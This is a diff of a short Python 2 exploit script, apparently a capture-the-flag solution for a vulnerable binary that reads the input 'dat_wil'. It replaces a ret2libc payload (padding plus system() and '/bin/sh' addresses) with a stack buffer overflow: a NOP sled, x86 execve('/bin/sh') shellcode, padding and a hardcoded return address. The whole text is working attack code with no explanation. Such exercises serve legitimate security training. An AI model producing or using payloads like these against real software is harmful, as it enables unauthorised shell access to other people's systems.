@@ -1,14 +1,16 @@
-offset = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK' + 8*b'MMMM' + b'NNNN'
+import struct
 
-sh_addr = struct.pack("I", 0xf7f897ec)
+shellcode = 32*"\x90" + "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\xb8\x0b\x00\x00\x00\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
 
-system = struct.pack("I", 0xf7e6aed0)
 
-address = b"AAAA"
+exploit = "dat_wil\n"
 
-nop = b'\x90'
+exploit += shellcode
 
-s_payload = "dat_wil\n"+offset+system+address+sh_addr
+exploit += b'A'*(80 - len(shellcode))
 
-import sys
-print s_payload
+exploit += struct.pack("I", 0xffffd6cc)
+
+
+
+print exploit
